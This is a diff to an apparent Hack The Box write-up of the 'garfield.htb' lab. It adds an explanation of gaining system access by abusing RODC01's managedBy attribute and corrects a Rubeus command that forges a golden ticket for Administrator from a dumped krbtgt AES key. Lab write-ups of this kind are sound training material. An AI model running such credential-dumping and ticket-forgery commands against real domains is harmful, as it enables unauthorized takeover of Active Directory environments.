@@ -568,7 +568,7 @@ nt authority\system
 
 ```
 
-Beautiful. We can get the krbtgt_8245 NT hash
+Beautiful. We can get the krbtgt_8245 NT hash. We have system-level access because we changed RODC01's "managedBy" attribute to l.wilson_adm, effectively making this account a local admin.
 
 ```
 ─(kali㉿kali)-[~/Hacks/garfield]                                                                                                                         
@@ -642,7 +642,7 @@ mimikatz(commandline) # exit
 Now that we have the krbtgt_8245's NTLM and AES, let's use these to get a golden ticket on RODC01. 
 
 ```
-*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe golden /rodcNumber:8245 flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357
+*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357
 
    ______        _
   (_____ \      | |
